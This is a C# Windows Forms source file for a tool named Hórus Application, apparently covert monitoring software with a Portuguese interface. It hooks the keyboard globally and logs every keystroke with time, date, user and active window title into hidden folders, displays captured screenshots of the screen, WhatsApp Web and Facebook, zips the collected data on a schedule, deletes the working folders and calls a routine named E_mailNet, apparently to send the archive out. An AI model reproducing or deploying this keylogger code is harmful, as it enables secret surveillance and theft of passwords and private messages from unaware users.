using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
//using HookEx;
using System.IO.Compression;
using Ionic.Zip;
using System.Data.SQLite;
using HookEx2;

namespace HorusApplication
{
    public partial class frmPrincipal : Form
    {
        UserActivityHook2 hook2;
        string log = string.Empty;
        int count = 0;
        int cont = 0;
        int cat = 0;

        TextReader oku = null, toku = null, doku = null, loku = null, uoku = null;
        TextWriter yaz, taz, daz, laz, naz, uaz, cc;

        frmTelas meuForm = new frmTelas();

        

        public frmPrincipal()
        {
            InitializeComponent();

            textBox6.Text = frmAcesso.senha;
          
            
            hook2 = new UserActivityHook2();

            if (time == 1)
            {
                hook2.KeyUp += (s, e) =>
                {
                    string filter = e.KeyData.ToString();

                    if (filter == "Space")
                    {
                        filter = " ";
                    }

                    else if (filter == "OemOpenBrackets")
                    {
                        filter = "´";
                    }

                    else if (filter == "Oem6")
                    {
                        filter = "[";
                    }

                    else if (filter == "Oem5")
                    {
                        filter = "]";
                    }

                    else if (filter == "OemQuestion")
                    {
                        filter = ";";
                    }

                    else if (filter == "Oem7")
                    {
                        filter = "~";
                    }

                    else if (filter == "RControlKey")
                    {
                        filter = "[Ctrl]";
                    }

                    else if (filter == "Oemplus")
                    {
                        filter = "=";
                    }

                    else if (filter == "OemMinus")
                    {
                        filter = "-";
                    }

                    else if (filter == "Oem1")
                    {
                        filter = "ç";
                    }

                    else if (filter == "LButton, Oemtilde")
                    {
                        filter = "/";
                    }

                    else if (filter == "LShiftKey")
                    {
                        filter = "[SHIFT]";
                    }

                    else if (filter == "OemPeriod")
                    {
                        filter = ".";
                    }

                    else if (filter == "Oemcomma")
                    {
                        filter = ",";
                    }

                    else if (filter == "Oemtilde")
                    {
                        filter = "'";
                    }

                    else if (filter == "LMenu")
                    {
                        filter = "[Alt]";
                    }

                    else if (filter == "Tab")
                    {
                        filter = "  ";
                    }

                    else if (filter == "LControlKey")
                    {
                        filter = "[Ctrl]";
                    }

                    else if (filter == "A")
                    {
                        filter = "a";
                    }

                    else if (filter == "B")
                    {
                        filter = "b";
                    }

                    else if (filter == "C")
                    {
                        filter = "c";
                    }
                    else if (filter == "D")
                    {
                        filter = "d";
                    }

                    else if (filter == "E")
                    {
                        filter = "e";
                    }

                    else if (filter == "F")
                    {
                        filter = "f";
                    }

                    else if (filter == "G")
                    {
                        filter = "g";
                    }

                    else if (filter == "H")
                    {
                        filter = "h";
                    }

                    else if (filter == "I")
                    {
                        filter = "i";
                    }

                    else if (filter == "J")
                    {
                        filter = "j";
                    }

                    else if (filter == "K")
                    {
                        filter = "k";
                    }

                    else if (filter == "L")
                    {
                        filter = "l";
                    }

                    else if (filter == "M")
                    {
                        filter = "m";
                    }

                    else if (filter == "N")
                    {
                        filter = "n";
                    }

                    else if (filter == "O")
                    {
                        filter = "o";
                    }

                    else if (filter == "P")
                    {
                        filter = "p";
                    }

                    else if (filter == "Q")
                    {
                        filter = "q";
                    }

                    else if (filter == "R")
                    {
                        filter = "r";
                    }

                    else if (filter == "S")
                    {
                        filter = "s";
                    }

                    else if (filter == "T")
                    {
                        filter = "t";
                    }

                    else if (filter == "U")
                    {
                        filter = "u";
                    }

                    else if (filter == "V")
                    {
                        filter = "v";
                    }

                    else if (filter == "W")
                    {
                        filter = "w";
                    }

                    else if (filter == "X")
                    {
                        filter = "x";
                    }

                    else if (filter == "Y")
                    {
                        filter = "y";
                    }

                    else if (filter == "Z")
                    {
                        filter = "z";
                    }

                    else if (filter == "D1")
                    {
                        filter = "1";
                    }

                    else if (filter == "D2")
                    {
                        filter = "2";
                    }

                    else if (filter == "D3")
                    {
                        filter = "3";
                    }

                    else if (filter == "D4")
                    {
                        filter = "4";
                    }
                    else if (filter == "D5")
                    {
                        filter = "5";
                    }

                    else if (filter == "D6")
                    {
                        filter = "6";
                    }

                    else if (filter == "D7")
                    {
                        filter = "7";
                    }

                    else if (filter == "D8")
                    {
                        filter = "8";
                    }

                    else if (filter == "D9")
                    {
                        filter = "9";
                    }

                    else if (filter == "D0")
                    {
                        filter = "0";
                    }

                    else if (filter == "Divide")
                    {
                        filter = "/";
                    }
                    else if (filter == "Capital")
                    {
                        filter = "[Caps Lock]";
                    }

                    else if (filter == "Return")
                    {
                        log = string.Empty;
                        filter = "[Enter]";
                        cont = cont + 1;
                        yaz = new StreamWriter(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas\Salvas" + Convert.ToString(cont) + ".txt");
                        yaz.Write(textBox1.Text);
                        yaz.Close();

                        taz = new StreamWriter(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas\Times" + Convert.ToString(cont) + ".txt");
                        taz.Write(DateTime.Now.ToLongTimeString());
                        taz.Close();

                        daz = new StreamWriter(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas\Dates" + Convert.ToString(cont) + ".txt");
                        daz.Write(DateTime.Now.ToShortDateString());
                        daz.Close();

                        uaz = new StreamWriter(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas\User" + Convert.ToString(cont) + ".txt");
                        uaz.Write(username);
                        uaz.Close();

                        if (getActiveWindowName() == null)
                        {
                            laz = new StreamWriter(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Documents\Salvas\notas\Local" + Convert.ToString(cont) + ".txt");
                            laz.WriteLine("Windows");
                        }
                        else
                        {
                            laz = new StreamWriter(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas\Local" + Convert.ToString(cont) + ".txt");
                            laz.Write(getActiveWindowName());
                        }
                        laz.Close();

                        naz = new StreamWriter(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas\Numer" + Convert.ToString(cont) + ".txt");
                        naz.Write(cat.ToString());
                        naz.Close();

                        //Inicio

                        count = cont - 1;
                        try
                        {
                             oku = new StreamReader(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas\Salvas" + Convert.ToString(count) + ".txt");
                            toku = new StreamReader(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas\Times" + Convert.ToString(count) + ".txt");
                            doku = new StreamReader(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas\Dates" + Convert.ToString(count) + ".txt");
                            loku = new StreamReader(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas\Local" + Convert.ToString(count) + ".txt");
                            uoku = new StreamReader(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas\User" + Convert.ToString(count) + ".txt");
                        }
                        catch { }
                        string satir;
                        string tatir;
                        string datir;
                        string latir;
                        string patir;
                        if (oku != null)
                        {
                            while ((satir = oku.ReadLine()) != null)
                            {
                                listBox1.Items.Add(satir);
                            }
                            while ((tatir = toku.ReadLine()) != null)
                            {
                                listBox4.Items.Add(tatir);
                            }
                            while ((datir = doku.ReadLine()) != null)
                            {
                                listBox3.Items.Add(datir);
                            }
                            while ((latir = loku.ReadLine()) != null)
                            {
                                listBox5.Items.Add(latir);
                            }
                            while ((patir = uoku.ReadLine()) != null)
                            {
                                listBox2.Items.Add(patir);
                            }
                        }
                        //Fim
                    }

                    log += filter;
                    textBox1.Text = log;
                    cat = cat + 1;
                };
            }

            else { }
        }

        public int j = 0;

        public static int time = 1;

        private void timer4_Tick(object sender, EventArgs e)
        {
            if (checkBox5.Checked == true)
            {
                if (checkBox1.Checked == true)
                {
                    if (time == 1)
                    {
                        timer1.Enabled = true;
                        timer2.Enabled = true;
                        timer3.Enabled = true;
                    }
                    else if (time == 2)
                    {
                        timer1.Enabled = false;
                        timer2.Enabled = false;
                        timer3.Enabled = false;
                    }
                    else { }

                    string dede = DateTime.Now.ToLongTimeString();
                    string caca = "00:00:00";
                    string cece = "00:00:02";
                    string cici = "00:00:03";

                    if (dede == caca)
                    {
                        timer1.Stop();
                        timer2.Stop();
                        timer3.Stop();

                        GC.Collect();
                        GC.WaitForPendingFinalizers();

                        panel1.Controls.Clear();
                        panel3.Controls.Clear();
                        panel4.Controls.Clear();

                        listBox1.Items.Clear();
                        listBox2.Items.Clear();
                        listBox3.Items.Clear();
                        listBox4.Items.Clear();

                        ((frmTelas)Application.OpenForms["frmTelas"]).HabilitarTimer(false);

                    }

                    else if (DateTime.Now.ToLongTimeString() == cece)
                    {
                        string path = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas";
                        File.SetAttributes(path, FileAttributes.Hidden);

                        using (ZipFile zip = new ZipFile())
                        {
                            zip.AddDirectory(path);
                            zip.Save(path + ".zip");
                            zip.Dispose();
                        }
                    }

                    else if (dede == cici)
                    {
                        try
                        {
                            string dTelas = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas";
                            string dNotas = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas";


                            if (Directory.Exists(dTelas))
                            {
                                System.IO.Directory.Delete(dTelas, true);
                                System.IO.Directory.Delete(dNotas, true);
                            }

                            else { }
                        }

                        catch { }

                        frmTelas meuForm = new frmTelas();

                        try
                        {
                            meuForm.counter = 0;
                            meuForm.wcounter = 0;
                            meuForm.fcounter = 0;

                            cont = 0;
                            count = 0;

                            meuForm.a = null;
                            j = 0;
                            imgs = null;
                        }
                        catch
                        {
                            meuForm.Dispose();
                        }

                        DirectoryInfo telas = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas");
                        telas.Attributes = FileAttributes.Hidden;

                        DirectoryInfo prints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\prints");
                        prints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo wprints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\wprints");
                        wprints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo fprints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\fprints");
                        fprints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo url = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\url");
                        url.Attributes = FileAttributes.Hidden;  

                        DirectoryInfo notas = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas");
                        notas.Attributes = FileAttributes.Hidden; 

                        try
                        {
                            E_mailNet();
                        }
                        catch { }
                    }

                    else
                    {
                        timer1.Start();
                        timer2.Start();
                        timer3.Start();

                        ((frmTelas)Application.OpenForms["frmTelas"]).HabilitarTimer(true);
                    }
                }
                else { }



                if (checkBox2.Checked == true)
                {
                    if (time == 1)
                    {
                        timer1.Enabled = true;
                        timer2.Enabled = true;
                        timer3.Enabled = true;
                    }
                    else if (time == 2)
                    {
                        timer1.Enabled = false;
                        timer2.Enabled = false;
                        timer3.Enabled = false;
                    }
                    else { }

                    string dedeii = DateTime.Now.ToLongTimeString();
                    string cacaii = "06:00:00";
                    string ceceii = "06:00:02";
                    string ciciii = "06:00:03";

                    if (dedeii == cacaii)
                    {
                        timer1.Stop();
                        timer2.Stop();
                        timer3.Stop();

                        GC.Collect();
                        GC.WaitForPendingFinalizers();

                        panel1.Controls.Clear();
                        panel3.Controls.Clear();
                        panel4.Controls.Clear();

                        listBox1.Items.Clear();
                        listBox2.Items.Clear();
                        listBox3.Items.Clear();
                        listBox4.Items.Clear();

                        ((frmTelas)Application.OpenForms["frmTelas"]).HabilitarTimer(false);
                    }

                    else if (dedeii == ceceii)
                    {
                        string path = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas";
                        File.SetAttributes(path, FileAttributes.Hidden);

                        using (ZipFile zip = new ZipFile())
                        {
                            zip.AddDirectory(path);
                            zip.Save(path + ".zip");
                            zip.Dispose();
                        }
                    }

                    else if (dedeii == ciciii)
                    {
                        try
                        {
                            string dTelas = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas";
                            string dNotas = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas";


                            if (Directory.Exists(dTelas))
                            {
                                System.IO.Directory.Delete(dTelas, true);
                                System.IO.Directory.Delete(dNotas, true);
                            }

                            else { }
                        }

                        catch { }

                        frmTelas meuForm = new frmTelas();

                        try
                        {
                            meuForm.counter = 0;
                            meuForm.wcounter = 0;
                            meuForm.fcounter = 0;

                            cont = 0;
                            count = 0;

                            meuForm.a = null;
                            j = 0;
                            imgs = null;
                        }
                        catch
                        {
                            meuForm.Dispose();
                        }

                        DirectoryInfo telas = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas");
                        telas.Attributes = FileAttributes.Hidden;

                        DirectoryInfo prints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\prints");
                        prints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo wprints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\wprints");
                        wprints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo fprints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\fprints");
                        fprints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo url = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\url");
                        url.Attributes = FileAttributes.Hidden;  

                        DirectoryInfo notas = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas");
                        notas.Attributes = FileAttributes.Hidden; 

                        try
                        {
                            E_mailNet();
                        }
                        catch { }
                    }

                    else
                    {
                        timer1.Start();
                        timer2.Start();
                        timer3.Start();

                        ((frmTelas)Application.OpenForms["frmTelas"]).HabilitarTimer(true);
                    }
                }
                else { }


                if (checkBox3.Checked == true)
                {
                    if (time == 1)
                    {
                        timer1.Enabled = true;
                        timer2.Enabled = true;
                        timer3.Enabled = true;
                    }
                    else if (time == 2)
                    {
                        timer1.Enabled = false;
                        timer2.Enabled = false;
                        timer3.Enabled = false;
                    }
                    else { }

                    string dedeiii = DateTime.Now.ToLongTimeString();
                    string cacaiii = "12:00:00";
                    string ceceiii = "12:00:00";
                    string ciciiii = "12:00:01";

                    if (dedeiii == cacaiii)
                    {
                        timer1.Stop();
                        timer2.Stop();
                        timer3.Stop();

                        GC.Collect();
                        GC.WaitForPendingFinalizers();

                        panel1.Controls.Clear();
                        panel3.Controls.Clear();
                        panel4.Controls.Clear();

                        listBox1.Items.Clear();
                        listBox2.Items.Clear();
                        listBox3.Items.Clear();
                        listBox4.Items.Clear();

                        ((frmTelas)Application.OpenForms["frmTelas"]).HabilitarTimer(false);
                    }


                    else if (dedeiii == ceceiii)
                    {
                        string path = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas";
                        File.SetAttributes(path, FileAttributes.Hidden);

                        using (ZipFile zip = new ZipFile())
                        {
                            zip.AddDirectory(path);
                            zip.Save(path + ".zip");
                            zip.Dispose();
                        }
                    }

                    else if (dedeiii == ciciiii)
                    {
                        try
                        {
                            string dTelas = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas";
                            string dNotas = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas";


                            if (Directory.Exists(dTelas))
                            {
                                System.IO.Directory.Delete(dTelas, true);
                                System.IO.Directory.Delete(dNotas, true);
                            }

                            else { }
                        }

                        catch { }

                        try
                        {
                            meuForm.counter = 0;
                            meuForm.wcounter = 0;
                            meuForm.fcounter = 0;

                            cont = 0;
                            count = 0;

                            meuForm.a = null;
                            j = 0;
                            imgs = null;
                        }
                        catch
                        {
                            meuForm.Dispose();
                        }

                        DirectoryInfo telas = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas");
                        telas.Attributes = FileAttributes.Hidden;

                        DirectoryInfo prints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\prints");
                        prints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo wprints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\wprints");
                        wprints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo fprints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\fprints");
                        fprints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo url = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\url");
                        url.Attributes = FileAttributes.Hidden;  

                        DirectoryInfo notas = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas");
                        notas.Attributes = FileAttributes.Hidden; 

                        try
                        {
                            E_mailNet();
                        }
                        catch { }
                    }

                    else
                    {
                        timer1.Start();
                        timer2.Start();
                        timer3.Start();

                        ((frmTelas)Application.OpenForms["frmTelas"]).HabilitarTimer(true);
                    }
                }
                else { }


                if (checkBox4.Checked == true)
                {
                    if (time == 1)
                    {
                        timer1.Enabled = true;
                        timer2.Enabled = true;
                        timer3.Enabled = true;
                    }
                    else if (time == 2)
                    {
                        timer1.Enabled = false;
                        timer2.Enabled = false;
                        timer3.Enabled = false;
                    }
                    else { }

                    string dedeiv = DateTime.Now.ToLongTimeString();
                    string cacaiv = "18:00:00";
                    string ceceiv = "18:00:02";
                    string ciciiv = "18:00:03";

                    if (dedeiv == cacaiv)
                    {
                        timer1.Stop();
                        timer2.Stop();
                        timer3.Stop();

                        GC.Collect();
                        GC.WaitForPendingFinalizers();

                        panel1.Controls.Clear();
                        panel3.Controls.Clear();
                        panel4.Controls.Clear();

                        listBox1.Items.Clear();
                        listBox2.Items.Clear();
                        listBox3.Items.Clear();
                        listBox4.Items.Clear();

                        ((frmTelas)Application.OpenForms["frmTelas"]).HabilitarTimer(false);
                    }

                    else if (dedeiv == ceceiv)
                    {
                        string path = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas";
                        File.SetAttributes(path, FileAttributes.Hidden);

                        using (ZipFile zip = new ZipFile())
                        {
                            zip.AddDirectory(path);
                            zip.Save(path + ".zip");
                            zip.Dispose();
                        }
                    }

                    else if (dedeiv == ciciiv)
                    {
                        try
                        {
                            string dTelas = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas";
                            string dNotas = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas";


                            if (Directory.Exists(dTelas))
                            {
                                System.IO.Directory.Delete(dTelas, true);
                                System.IO.Directory.Delete(dNotas, true);
                            }

                            else { }
                        }

                        catch { }

                        frmTelas meuForm = new frmTelas();

                        try
                        {
                            meuForm.counter = 0;
                            meuForm.wcounter = 0;
                            meuForm.fcounter = 0;

                            cont = 0;
                            count = 0;

                            meuForm.a = null;
                            j = 0;
                            imgs = null;
                        }
                        catch
                        {
                            meuForm.Dispose();
                        }

                        DirectoryInfo telas = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas");
                        telas.Attributes = FileAttributes.Hidden;

                        DirectoryInfo prints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\prints");
                        prints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo wprints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\wprints");
                        wprints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo fprints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\fprints");
                        fprints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo url = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\url");
                        url.Attributes = FileAttributes.Hidden;  

                        DirectoryInfo notas = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas");
                        notas.Attributes = FileAttributes.Hidden; 

                        try
                        {
                            E_mailNet();
                        }
                        catch { }
                    }

                    else
                    {
                        timer1.Start();
                        timer2.Start();
                        timer3.Start();

                    }
                }

                else { }

            }
        }
        
        private void telasCapturadasToolStripMenuItem_Click(object sender, EventArgs e)
        {
            panel1.Size = new Size(230, 525);
            
            pictureBox1.Visible = true;
            label1.Text = "Telas Capturadas";
            button2.Visible = true;

            panel3.Size = new Size(0, 525);
            panel4.Size = new Size(0, 525);
            panel6.Visible = false;

            pictureBox1.Image = null;

            tabControl2.Visible = false;

        }        
       
        private void frmPrincipal_Load(object sender, EventArgs e)
        {           
            frmTelas gg = new frmTelas();
            gg.Show();
            gg.Hide();
        }

        public void Aparece(object sender, EventArgs e)
        {
            var snd = (PictureBox)sender;
            pictureBox1.Image = snd.Image;
        }

        string imgs;
   
        private void timer1_Tick(object sender, EventArgs e)
        {
                        
            panel1.Controls.Clear();

            String MEN = "C:/Users/" + Environment.UserName.ToString() + @"/Documents/Salvas/Telas/prints/";

            String[] fil = System.IO.Directory.GetFiles(MEN);

            int quantimages = fil.Length;

            String[] imgs = new String[quantimages];

            for (int j = 1; j <= quantimages; j++)
            {
                imgs[j - 1] = MEN + "myimg" + j.ToString() + ".jpg";
            }

            PictureBox[] a = new PictureBox[quantimages];

            int count = 0, pos = 35;
            for (int i = 0; i < imgs.Length; i++)
            {
                try 
                {
                    a[i] = new PictureBox();
                    a[i].Image = Image.FromFile(imgs[i]);


                    a[i].Location = new Point(35, pos);
                    a[i].SizeMode = PictureBoxSizeMode.StretchImage;

                    a[i].Width = a[i].Image.Width / 10;
                    a[i].Height = a[i].Image.Height / 10;

                    a[i].Padding = new Padding(2, 2, 2, 2);

                    a[i].Click += Aparece;
                    a[i].BackColor = Color.Black;

                    panel1.Controls.Add(a[i]);


                    pos += a[i].Image.Height / 10 + 10;
                    count++;
                }
                catch{}
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            frmAviso_Saida gg = new frmAviso_Saida();
            gg.Visible = true;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            tabControl2.Visible = false;

            panel1.Size = new Size(0, 525);
            panel3.Size = new Size(0, 525);
            panel4.Size = new Size(0, 525);
            panel6.Visible = false;
            pictureBox1.Image = null;
            pictureBox1.Visible = false;
            dataGridView1.Visible = false;

            label1.Text = "Hórus Application";
            button2.Visible = false;
            
        }       

        private void timer2_Tick(object sender, EventArgs e)
        {
            panel3.Controls.Clear();
            String MEN = "C:/Users/" + Environment.UserName.ToString() + @"/Documents/Salvas/Telas/wprints/";

            String[] fil = System.IO.Directory.GetFiles(MEN);

            int quantimages = fil.Length;

            String[] imgs = new String[quantimages];

            for (int j = 1; j <= quantimages; j++)
            {
                imgs[j - 1] = MEN + "wmyimg" + j.ToString() + ".jpg";
            }

            PictureBox[] a = new PictureBox[quantimages];

            int count = 0, pos = 35;
            for (int i = 0; i < imgs.Length; i++)
            {
                try
                {

                    a[i] = new PictureBox();
                    a[i].Image = Image.FromFile(imgs[i]);


                    a[i].Location = new Point(35, pos);
                    a[i].SizeMode = PictureBoxSizeMode.StretchImage;

                    a[i].Width = a[i].Image.Width / 10;
                    a[i].Height = a[i].Image.Height / 10;

                    a[i].Padding = new Padding(2, 2, 2, 2);

                    a[i].Click += Aparece;
                    a[i].BackColor = Color.Black;

                    panel3.Controls.Add(a[i]);


                    pos += a[i].Image.Height / 10 + 10;
                    count++;
                }
                catch { }
            }
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            panel3.Size = new Size(230, 525);

            pictureBox1.Visible = true;
            label1.Text = "WhatsApp Web";
            button2.Visible = true;

            panel1.Size = new Size(0, 525);
            panel4.Size = new Size(0, 525);
            panel6.Visible = false;
            tabControl2.Visible = false;

            pictureBox1.Image = null;
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            panel4.Size = new Size(230, 525);

            pictureBox1.Visible = true;
            label1.Text = "Facebook";
            button2.Visible = true;

            panel1.Size = new Size(0, 525);
            panel3.Size = new Size(0, 525);
            panel6.Visible = false;
            tabControl2.Visible = false;

            pictureBox1.Image = null;
        }       
        
        private void timer3_Tick(object sender, EventArgs e)
        {
            panel4.Controls.Clear();
            String MEN = "C:/Users/" + Environment.UserName.ToString() + @"/Documents/Salvas/Telas/fprints/";

            String[] fil = System.IO.Directory.GetFiles(MEN);

            int quantimages = fil.Length;

            String[] imgs = new String[quantimages];

            for (int j = 1; j <= quantimages; j++)
            {
                imgs[j - 1] = MEN + "fmyimg" + j.ToString() + ".jpg";

            }

            PictureBox[] a = new PictureBox[quantimages];

            int count = 0, pos = 35;
            for (int i = 0; i < imgs.Length; i++)
            {
                try
                {
                    a[i] = new PictureBox();
                    a[i].Image = Image.FromFile(imgs[i]);


                    a[i].Location = new Point(35, pos);
                    a[i].SizeMode = PictureBoxSizeMode.StretchImage;

                    a[i].Width = a[i].Image.Width / 10;
                    a[i].Height = a[i].Image.Height / 10;

                    a[i].Padding = new Padding(2, 2, 2, 2);

                    a[i].Click += Aparece;
                    a[i].BackColor = Color.Black;

                    panel4.Controls.Add(a[i]);


                    pos += a[i].Image.Height / 10 + 10;
                    count++;
                }
                catch { }

            }
        }        

        private void button4_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }        

        private void button3_Click_1(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Maximized)
            {
                this.WindowState = FormWindowState.Normal;                
            }
            else if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else { }
        }

        private void frmPrincipal_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        public const int WM_NCLBUTTONDOWN = 0xA1;

        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]

        public static extern int SendMessage(IntPtr hWnd,

        int Msg, int wParam, int lParam);

        [DllImportAttribute("user32.dll")]

        public static extern bool ReleaseCapture();

        private void panel2_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }


        private void opsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (toolStripMenuItem1.Text == "")
            {  
                menuStrip1.Size = new Size(180, 432);

                opsToolStripMenuItem.Size = new Size(180, 40);

                telasCapturadasToolStripMenuItem.Text = " Telas Capturadas";
                telasCapturadasToolStripMenuItem.Size = new Size(180, 40);
                telasCapturadasToolStripMenuItem.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft; 

                toolStripMenuItem4.Text = " Facebook";
                toolStripMenuItem4.Size = new Size(180, 40);
                toolStripMenuItem4.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft; 

                toolStripMenuItem3.Text = " WhatsApp Web";
                toolStripMenuItem3.Size = new Size(180, 40);
                toolStripMenuItem3.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft; 

                toolStripMenuItem1.Text = " Configurações";
                toolStripMenuItem1.Size = new Size(180, 40);
                toolStripMenuItem1.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft; 
                
                toolStripMenuItem2.Text = " Teclas Capturadas";
                toolStripMenuItem2.Size = new Size(180, 40);
                toolStripMenuItem2.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;

                toolStripMenuItem5.Text = " Luz on/off";
                toolStripMenuItem5.Size = new Size(180, 40);
                toolStripMenuItem5.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;

                toolStripMenuItem6.Text = " Sites Acessados";
                toolStripMenuItem6.Size = new Size(180, 40);
                toolStripMenuItem6.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;

                
                
            }
            else
            {
                menuStrip1.Size = new Size(41, 432);

                opsToolStripMenuItem.Size = new Size(40, 40);

                telasCapturadasToolStripMenuItem.Text = "";
                telasCapturadasToolStripMenuItem.Size = new Size(40, 40);
                telasCapturadasToolStripMenuItem.ImageAlign = System.Drawing.ContentAlignment.MiddleCenter; 

                toolStripMenuItem4.Text = "";
                toolStripMenuItem4.Size = new Size(40, 40);
                toolStripMenuItem4.ImageAlign = System.Drawing.ContentAlignment.MiddleCenter; 

                toolStripMenuItem3.Text = "";
                toolStripMenuItem3.Size = new Size(40, 40);
                toolStripMenuItem3.ImageAlign = System.Drawing.ContentAlignment.MiddleCenter; 

                toolStripMenuItem1.Text = "";
                toolStripMenuItem1.Size = new Size(40, 40);
                toolStripMenuItem1.ImageAlign = System.Drawing.ContentAlignment.MiddleCenter; 

                toolStripMenuItem2.Text = "";
                toolStripMenuItem2.Size = new Size(40, 40);
                toolStripMenuItem2.ImageAlign = System.Drawing.ContentAlignment.MiddleCenter;

                toolStripMenuItem5.Text = "";
                toolStripMenuItem5.Size = new Size(40, 40);
                toolStripMenuItem5.ImageAlign = System.Drawing.ContentAlignment.MiddleCenter;

                toolStripMenuItem6.Text = "";
                toolStripMenuItem6.Size = new Size(40, 40);
                toolStripMenuItem6.ImageAlign = System.Drawing.ContentAlignment.MiddleCenter; 
            }

            
        }

        public string previousWindow = String.Empty;

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder txt, int count);

        public void getWindowTitle()
        {
            if (previousWindow == getActiveWindowName()){}

            else
            {
                previousWindow = getActiveWindowName();
            }
        }

